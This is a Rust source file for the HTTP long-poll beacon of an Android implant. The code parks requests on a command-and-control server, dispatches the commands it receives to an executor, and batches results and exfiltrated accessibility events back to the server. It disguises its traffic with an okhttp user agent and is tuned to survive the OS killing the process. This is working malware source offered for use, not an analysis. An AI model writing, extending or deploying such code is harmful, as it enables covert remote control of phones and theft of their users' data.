//! HTTP long-poll beacon transport.
//!
//! Replaces the WebSocket for the reaped-process reality: ColorOS kills this
//! process every ~48s, so a "persistent" socket is really a flapping one. Here
//! the implant parks a POST on the Durable Object, which resolves it the instant
//! a command is enqueued, so delivery is still push-fast without any socket
//! ownership crossing the Worker <-> DO boundary.
//!
//! Channel contract matches the old `WsTransport::connect`, so the core's
//! command executor, framing, heartbeat and event exfil are untouched:
//!   rx = frames to send (heartbeat / result / event JSON, one per item)
//!   tx = inbound command frames from the C2

use anyhow::Result;
use std::time::Duration;
use tokio::sync::mpsc;
use tracing::{debug, error, info};

/// Server parks the poll for ~25s; allow generous headroom on top of that.
const POLL_TIMEOUT: Duration = Duration::from_secs(40);
const RECV_TIMEOUT: Duration = Duration::from_secs(15);
/// Batch window for outbound frames. Results are produced within milliseconds
/// of a dispatched command, so this stays invisible in practice while still
/// coalescing bursts of a11y events into one request.
const BATCH_WINDOW: Duration = Duration::from_millis(250);
const MAX_BATCH: usize = 64;

pub struct PollTransport {
    poll_url: String,
    recv_url: String,
    pub implant_id: String,
}

impl PollTransport {
    pub fn new(domain: &str, implant_id: &str) -> Self {
        Self {
            poll_url: format!("https://{}/t/poll/{}", domain, implant_id),
            recv_url: format!("https://{}/t/recv/{}", domain, implant_id),
            implant_id: implant_id.to_string(),
        }
    }

    pub async fn run(
        &self,
        mut rx: mpsc::Receiver<Vec<u8>>,
        tx: mpsc::Sender<Vec<u8>>,
    ) -> Result<()> {
        // webpki-roots, not the Android system store: same reason the WSS path
        // needed it, the platform trust store is not reachable from this process.
        let client = reqwest::Client::builder()
            .user_agent("okhttp/4.12.0")
            .build()?;

        info!("BEACON online: {}", self.poll_url);

        // Frames are held here until the C2 accepts them, so a failed /recv (or a
        // reap mid-flight) never silently drops a command result.
        let mut outbox: Vec<String> = Vec::new();
        let mut consecutive_failures: u32 = 0;

        loop {
            // ---- 1. Collect outbound frames (short window, then flush) ----
            if outbox.len() < MAX_BATCH {
                let deadline = tokio::time::Instant::now() + BATCH_WINDOW;
                while outbox.len() < MAX_BATCH {
                    match tokio::time::timeout_at(deadline, rx.recv()).await {
                        Ok(Some(frame)) => {
                            outbox.push(String::from_utf8_lossy(&frame).into_owned());
                        }
                        // Channel closed: core is shutting down.
                        Ok(None) => {
                            self.flush(&client, &mut outbox).await;
                            return Ok(());
                        }
                        Err(_elapsed) => break,
                    }
                }
            }

            if !outbox.is_empty() {
                self.flush(&client, &mut outbox).await;
                // Keep draining if we are still backlogged instead of parking.
                if !outbox.is_empty() {
                    continue;
                }
            }

            // ---- 2. Park a long-poll for commands, still draining outbound ----
            // The DO holds this poll for ~25s. Draining `rx` MUST happen concurrently
            // with the park: a result produced after BATCH_WINDOW -- i.e. essentially
            // every real command, which spawns a thread and does JNI work -- used to
            // sit in the channel until the poll expired, costing the full 25s window
            // per command (~27s measured end to end). Only trivially fast commands
            // like `ls` beat the 250ms window, which is why those alone looked fast.
            let poll_result = {
                let poll = self.poll(&client);
                tokio::pin!(poll);
                loop {
                    tokio::select! {
                        r = &mut poll => break Some(r),
                        maybe = rx.recv() => {
                            match maybe {
                                Some(frame) => {
                                    outbox.push(String::from_utf8_lossy(&frame).into_owned());
                                }
                                // Channel closed: core is shutting down.
                                None => {
                                    self.flush(&client, &mut outbox).await;
                                    break None;
                                }
                            }
                            // Small batch window, then push the result out at once.
                            while outbox.len() < MAX_BATCH {
                                match tokio::time::timeout(BATCH_WINDOW, rx.recv()).await {
                                    Ok(Some(frame)) => outbox
                                        .push(String::from_utf8_lossy(&frame).into_owned()),
                                    _ => break,
                                }
                            }
                            self.flush(&client, &mut outbox).await;
                        }
                    }
                }
            };

            let cmds = match poll_result {
                Some(Ok(cmds)) => {
                    consecutive_failures = 0;
                    cmds
                }
                Some(Err(e)) => {
                    consecutive_failures += 1;
                    error!("BEACON poll error ({}): {}", consecutive_failures, e);
                    // Let the caller's backoff handle a real outage rather than
                    // spinning here on a dead network.
                    if consecutive_failures >= 3 {
                        anyhow::bail!("beacon poll failed {} times", consecutive_failures);
                    }
                    Vec::new()
                }
                // rx closed while parked: shut down cleanly.
                None => return Ok(()),
            };

            // ---- 3. Dispatch commands into the existing executor path ----
            for cmd_json in cmds {
                debug!("CMD queued: {}", &cmd_json[..cmd_json.len().min(160)]);
                if tx.send(cmd_json.into_bytes()).await.is_err() {
                    return Ok(()); // inbound handler gone; caller will reconnect
                }
            }
        }
    }

    /// POST outbound frames as a JSON array. On failure the frames stay in the
    /// outbox and are retried on the next pass. Returns true when accepted.
    async fn flush(&self, client: &reqwest::Client, outbox: &mut Vec<String>) {
        if outbox.is_empty() {
            return;
        }
        let body = format!("[{}]", outbox.join(","));
        let batch_len = outbox.len();

        match client
            .post(&self.recv_url)
            .header("Content-Type", "application/json")
            .timeout(RECV_TIMEOUT)
            .body(body)
            .send()
            .await
        {
            Ok(r) if r.status().is_success() => {
                debug!("BEACON flushed {} frame(s)", batch_len);
                outbox.clear();
            }
            Ok(r) => {
                error!("BEACON /recv rejected: {}", r.status());
                // Keep frames; the next loop retries them.
            }
            Err(e) => {
                error!("BEACON /recv failed: {} (keeping {} frame(s))", e, batch_len);
            }
        }
    }

    /// Park on the C2 and return any command frames as raw JSON strings.
    async fn poll(&self, client: &reqwest::Client) -> Result<Vec<String>> {
        let resp = client
            .post(&self.poll_url)
            .header("Content-Type", "application/json")
            .timeout(POLL_TIMEOUT)
            .body("{}")
            .send()
            .await?;

        let status = resp.status();
        if !status.is_success() {
            anyhow::bail!("poll status {}", status);
        }

        let text = resp.text().await?;
        let v: serde_json::Value = serde_json::from_str(&text)
            .map_err(|e| anyhow::anyhow!("poll body unparseable: {} ({})", e, &text[..text.len().min(120)]))?;

        let out: Vec<String> = v
            .get("cmds")
            .and_then(|c| c.as_array())
            .map(|arr| arr.iter().map(|c| c.to_string()).collect())
            .unwrap_or_default();

        if !out.is_empty() {
            info!("BEACON dispatched {} command(s)", out.len());
        }
        Ok(out)
    }
}
